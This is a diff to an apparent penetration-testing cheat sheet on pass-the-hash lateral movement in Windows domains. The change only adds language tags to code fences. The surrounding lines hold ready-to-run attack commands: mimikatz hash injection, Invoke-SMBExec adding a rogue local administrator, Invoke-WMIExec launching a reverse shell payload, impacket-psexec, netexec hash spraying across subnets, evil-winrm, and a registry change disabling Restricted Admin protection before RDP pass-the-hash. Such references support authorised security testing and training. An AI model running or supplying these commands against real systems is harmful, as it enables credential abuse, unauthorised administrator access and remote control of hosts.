@@ -9,7 +9,7 @@
 
 > Run on the Windows host.
 
-```
+```powershell
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<NThash> /domain:<domain> /run:cmd.exe" exit
 ```
 
@@ -20,7 +20,7 @@ Spawns a process in the context of the target user using their NTLM hash. `/rc4`
 
 > Run on the Windows host.
 
-```
+```powershell
 Import-Module .\Invoke-TheHash.psd1
 Invoke-SMBExec -Target <target> -Domain <domain> -Username <user> -Hash <NThash> -Command "net user <user> <password> /add && net localgroup administrators <user> /add" -Verbose
 ```
@@ -29,7 +29,7 @@ Executes a command on the target via SMB using a hash. Useful for adding a local
 
 **Reverse Shell**
 
-```
+```powershell
 Invoke-WMIExec -Target <target> -Domain <domain> -Username <user> -Hash <NThash> -Command "<base64 reverse shell payload>"
 ```
 
@@ -40,7 +40,7 @@ Start a listener, execute a command via WMI. Use the machine name instead of the
 
 > Run on the Linux host.
 
-```
+```bash
 impacket-psexec <user>@<target> -hashes :<NThash>
 ```
 
@@ -51,7 +51,7 @@ Executes commands on the target via SMB/PsExec using a hash. LM portion can be l
 
 > Run on the Linux host.
 
-```
+```bash
 netexec smb <target/subnet> -u <user> -d <domain> -H <NThash>
 ```
 
@@ -62,7 +62,7 @@ Sprays a hash across a subnet. `Pwn3d!` in output indicates local admin access o
 
 > Run on the Linux host.
 
-```
+```bash
 evil-winrm -i <target> -u <user> -H <NThash>
 ```
 
@@ -73,13 +73,13 @@ Opens a WinRM session using a hash. Requires WinRM to be accessible on the targe
 
 > Run on the Windows target first, then the Linux attack host.
 
-```
+```powershell
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
 Enables Restricted Admin Mode on the target. Required for hash-based RDP authentication.
 
-```
+```powershell
 xfreerdp /v:<target> /u:<user> /pth:<NThash>
 ```
 
